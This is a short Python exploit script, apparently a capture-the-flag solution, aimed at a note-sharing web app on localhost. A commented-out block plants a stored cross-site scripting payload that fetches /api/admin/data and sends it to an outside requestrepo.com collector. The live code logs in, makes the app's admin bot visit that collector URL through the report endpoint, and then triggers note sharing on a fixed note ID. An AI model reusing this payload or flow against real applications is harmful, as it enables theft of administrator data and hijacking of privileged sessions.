import requests,time

s = requests.Session()

"""s.get('http://127.0.0.1:3000/register')

r = s.post(url='http://127.0.0.1:3000/api/note',
           headers={"Content-Type":"application/json"},
           data = {
               "title":"bbt",
               "content": 
                   '''<img src='http://460w2vb2.requestrepo.com?image_was_call'>
                   <script>fetch('http://127.0.0.1:3000/api/admin/data').then(
                       response => response.text()).then( text => 
                           fetch('http://460w2vb2.requestrepo.com?flag='+text))</script>'''
           })

note_id = r.json().get('id')"""

s.post(url = 'http://127.0.0.1:3000/login', data = {"username":"73b0041e"})

s.post(url = "http://127.0.0.1:3000/report",
       data = {
           "url":"http://460w2vb2.requestrepo.com"
       })
time.sleep(20)
note_id = '3c81b3b86cb12b8a'
s.post(url = f"http://127.0.0.1:3000/api/note/{note_id}/share", allow_redirects=False)
s.post(url = f"http://127.0.0.1:3000/api/note/{note_id}/share", allow_redirects=False)

